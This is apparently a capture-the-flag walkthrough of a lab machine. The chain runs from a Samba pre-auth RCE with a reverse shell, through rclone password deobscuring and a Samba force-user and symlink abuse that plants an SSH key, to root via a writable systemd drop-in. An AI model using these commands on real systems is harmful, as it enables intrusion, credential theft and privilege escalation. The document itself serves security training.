## Enumeration

Start with classical nmap scans

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only SSH and Samba are exposed. With no valid credentials yet, SSH is a dead end for now, which leaves Samba as the obvious entry point. The host script results confirm the box is reachable over SMB and give us the NetBIOS name:

```
|_nbstat: NetBIOS name: ABDUCTED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time:
|   date: 2026-08-20T15:28:21
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

Message signing being *enabled but not required* is worth noting for later (it rules out signing as a blocker for any SMB relay/impersonation trickery), but the more immediate question is simply: **what Samba version is this, and is it vulnerable to anything?**

## Foothold — Unauthenticated RCE in Samba (CVE-2026-4480)

The exposed `smbd` build maps to **CVE-2026-4480**, a pre-authentication remote code execution vulnerability in Samba, with a public exploit available:

[https://github.com/0xBlackash/CVE-2026-4480](https://github.com/0xBlackash/CVE-2026-4480)

Running it against the target pops a shell without needing any credentials at all:

```bash
python3 CVE-2026-4480.py --target 10.129.78.165 --lhost 10.10.14.117 --lport 1337
```

```
listening on [any] 1337 ...
connect to [10.10.14.117] from (UNKNOWN) [10.129.78.165] 35926
bash: cannot set terminal process group (1577): Inappropriate ioctl for device
bash: no job control in this shell
nobody@abducted:/var/spool/samba$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
```

The resulting shell runs as `nobody` (uid `65534`), which is exactly what you'd expect from a Samba worker process that isn't tied to an authenticated session — Samba maps unauthenticated/guest-like operations to an unprivileged system account, not to root. This tells us straight away that the RCE alone won't be enough; we're going to need to pivot to a real user.

## From `nobody` to `scott` — An Obscured Backup Password

With a low-privilege shell, the next logical move is to look for anything an automated process might have left lying around — cron jobs, backup scripts, service credentials. A search for common backup-tool configuration files turns up an `rclone` config:

```bash
find / -type f \( -name "rclone.conf" -o -name ".rclone.conf" \) 2>/dev/null
```

```
/opt/offsite-backup/rclone.conf
```

```bash
cat /opt/offsite-backup/rclone.conf
```

```ini
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

This looks like a dead end at first glance — the password is clearly not plaintext. But it's important to recognize *what kind* of protection this is. rclone doesn't encrypt credentials in its config file; it **obscures** them with a simple, reversible, well-documented scheme (AES-CTR with a hardcoded key, purely to avoid storing passwords in cleartext on disk, not to provide real confidentiality). Since the algorithm and key are public, any obscured rclone password can be reversed with the right tool:

```bash
python3 rclonedeobscure.py -d "HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw"
```

```
[+] obscured password   : HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
[+] deobscured password : iXzvcib3SrpZ
```

The `[offsite]` block is configured for `svc-backup` over SFTP, but the deobscured password turns out to also work for the local user `scott` over SSH.

```bash
ssh scott@10.129.78.165
```

```
scott@abducted:~$ id
uid=1000(scott) gid=1001(scott) groups=1001(scott)
```

## From `scott` to `marcus` — Abusing `force user` in Samba

Poking around the filesystem, `scott` has access to `/srv`, which contains a `transfer` share also exposed over SMB:

```
scott@abducted:~$ cd /srv/
scott@abducted:/srv$ ls
projects  transfer
```

The corresponding block in `smb.conf` is the key to this stage:

```ini
[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
```

Three directives matter here. `valid users = scott` means only `scott` can authenticate to this share — nothing surprising. `force user = marcus` tells `smbd` that **regardless of who authenticates**, every filesystem operation performed through this share should be carried out as if it were done by `marcus`. This is a legitimate Samba feature, normally used so that multiple users writing to a shared folder all produce files with a single, consistent owner — but it also means that authenticating as `scott` and going through Samba gives you `marcus`'s filesystem privileges, even though `scott` and `marcus` have no relationship at the Unix permission level. The third directive, `wide links = yes`, is what actually makes `marcus`'s home directory reachable from inside this share in the first place — by default Samba refuses to follow symlinks that point *outside* the share's own path, and `wide links` disables that restriction.

Working locally on the box, `scott` has no access to `marcus`'s home directory at all:

```
scott@abducted:/srv/transfer$ cd marcus
-bash: cd: marcus: Permission denied
```

That's just Unix enforcing ordinary DAC permissions — `scott` isn't `marcus`, isn't in his group, and the directory isn't world-accessible. The `Permission denied` here isn't Samba stopping us; it's the local shell, because `/home/marcus` doesn't exist as an entry under `/srv/transfer` yet — nothing has linked it there. Since the share directory itself is writable by `scott`, the fix is to create that link ourselves:

```bash
scott@abducted:/srv/transfer$ ln -s /home/marcus
```

This drops a symlink named `marcus` inside `/srv/transfer`, pointing at `/home/marcus`. On the local filesystem this symlink is still useless to `scott` — following it still hits the same Unix permission wall as before. But `smbd` is a different story: because `wide links = yes` is set on this share, Samba will happily follow a symlink that escapes the share's root, and because `force user = marcus` is also set, it does so **as marcus**. The combination of the two directives is what turns an ordinary "staff file transfer" share into a way to reach another user's home directory entirely.

Connecting over SMB and browsing into the share confirms this:

```bash
smbclient //localhost/transfer -U scott%iXzvcib3SrpZ
```

```
smb: \> dir
  .                                   D        0  Thu Aug 20 16:09:24 2026
  ..                                  D        0  Thu Aug 20 16:09:24 2026
  marcus                              D        0  Thu Jun  4 13:47:57 2026

smb: \> cd marcus\
smb: \marcus\> dir
  .                                   D        0  Thu Jun  4 13:47:57 2026
  ..                                  D        0  Thu Jun  4 13:41:30 2026
  .profile                            H      807  Sun Mar 31 08:41:03 2024
  .bash_logout                        H      220  Sun Mar 31 08:41:03 2024
  .bash_history                       H        0  Thu Jun  4 13:47:57 2026
  .bashrc                             H     3771  Sun Mar 31 08:41:03 2024
  .cache                             DH        0  Thu Jun  4 13:41:30 2026
```

`smbclient` walks straight into `marcus`'s home directory through the symlink we just created. In other words, the Samba layer is granting an effective privilege that the underlying OS explicitly denies — the exact scenario `force user` combined with `wide links` is capable of creating if a share isn't scoped carefully. Two separate misconfigurations had to line up for this to work: `wide links` letting a symlink escape the share's boundary, and `force user` making sure that whoever walks through it does so with `marcus`'s identity rather than `scott`'s.

Read access to `marcus`'s home is useful, but the goal is a shell as `marcus`, and the share is also **writable** (`read only = no`). The plan is straightforward: drop our own SSH public key into `marcus`'s `authorized_keys`, using the same `force user` trick to write it as `marcus` despite not being `marcus`.

First, generate a fresh keypair to use for this box, and serve the public key over HTTP so the target can pull it:

```bash
ssh-keygen -t ed25519
```

Then, from the SMB session, fetch it and copy it into place under `marcus`'s `.ssh` directory:

```
scott@abducted:/srv/transfer$ curl http://10.10.14.117:8000/id_ed25519.pub -o id_ed25519.pub
```

```
smb: \> scopy id_ed25519.pub marcus\.ssh\authorized_keys
smb: \> cd marcus\.ssh\
smb: \marcus\.ssh\> dir
  .                                   D        0  Sat Aug 22 07:07:50 2026
  ..                                  D        0  Sat Aug 22 07:03:10 2026
  authorized_keys                     A       91  Sat Aug 22 07:07:50 2026
```

Because the write happens through `smbd` with `force user = marcus` in effect, the resulting `authorized_keys` file is owned by `marcus` and lands exactly where SSH expects to find it. From here, authenticating as `marcus` is just a matter of using the matching private key:

```bash
ssh -i ~/.ssh/id_ed25519 marcus@10.129.79.250
```

```
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

## Privilege Escalation — From `marcus` to `root`

The `id` output above is the first real clue for this stage. Alongside his own primary group, `marcus` is a member of `operators` — a group name that doesn't correspond to anything standard on a stock Ubuntu install (unlike `sudo`, `adm`, or `www-data`, which have well-known, well-documented meanings). A non-standard group like this is almost always custom-made to grant access to something specific, which makes it the natural next thing to enumerate.

Rather than guessing, the systematic way to find out what `operators` actually controls is to search the filesystem for anything owned by that group:

```bash
find / -group operators 2>/dev/null
```

```
/etc/systemd/system/smbd.service.d
```

A single result, and a meaningful one: a **systemd drop-in directory** for the `smbd` service. Before drawing any conclusions, it's worth confirming exactly what access the group has on it:

```bash
ls -la /etc/systemd/system/smbd.service.d
```

```
total 8
drwxrws--- 2 root operators 4096 Jun  4 13:41 .
drwxr-xr-x 26 root root      4096 Jun  4 13:41 ..
```

Breaking down `drwxrws---`: the owner (`root`) has full `rwx`; the group (`operators`) has `rw` plus the SGID bit in place of the execute flag; `other` has nothing at all. The `rw` on the group entry is the important part — it confirms that any member of `operators`, including `marcus`, can create and write files in this directory. (The `s` in place of `x` is the SGID bit set on the directory itself, meaning any file `marcus` creates here will automatically inherit the `operators` group — a convenience detail, not a requirement for the exploit.)

Write access to `smbd.service.d` matters because of what that directory is for. systemd allows a service's configuration to be extended, without touching the original unit file, by dropping `.conf` snippets into `<service-name>.service.d/`; anything defined there gets merged into the unit at load time. Since `smbd` is a system service, it is started by systemd — as **root** — regardless of which unprivileged user happens to trigger the restart. Put together, this means: *whoever can write into this directory can make root run arbitrary commands the next time the service starts.*

That's enough to build a straightforward privilege escalation payload. The idea is to have systemd, immediately before starting `smbd`, copy `/bin/bash` somewhere writable and set the SUID bit on it:

```bash
cat > pwn.conf << 'EOF'
[Service]
ExecStartPre=-/bin/bash -c "cp /bin/bash /tmp/pwn; chmod 6777 /tmp/pwn"
EOF
```

A couple of details in that line are deliberate:

- The leading `-` in front of `/bin/bash` tells systemd to ignore a non-zero exit code from this command and continue starting the service anyway, instead of treating the whole unit as failed. This keeps the restart looking clean even if something about the payload goes wrong.
- `chmod 6777` sets `777` (read/write/execute for everyone) plus the **SUID** and **SGID** bits (`4 + 2 = 6`). Since the copy is performed by a process running as root, the resulting binary is owned by `root` — so the SUID bit means anyone who executes it runs with root's effective privileges.

With the drop-in in place, reload systemd's unit cache and restart the service to trigger it:

```bash
systemctl daemon-reload
systemctl restart smbd
```

Restarting `smbd` causes systemd, running as PID 1 with root privileges, to execute the injected `ExecStartPre` command before bringing the service back up — producing a root-owned, SUID copy of `bash` at `/tmp/pwn`.

The last step is executing that binary correctly. Simply running `/tmp/pwn` would spawn a bash process with an effective UID of `0`, but bash includes a built-in safeguard: when it detects that its effective UID doesn't match its real UID (a telltale sign of a SUID binary), it automatically drops the elevated privileges unless told not to. The `-p` (privileged) flag disables that safeguard:

```bash
/tmp/pwn -p
```

```
pwn-5.2# id
uid=1001(marcus) gid=1002(marcus) euid=0(root) egid=0(root) groups=0(root),1000(operators),1002(marcus)
```

The real UID is still `marcus`, but the effective UID — the one the kernel actually checks for permission decisions — is `0`. That's a root shell.
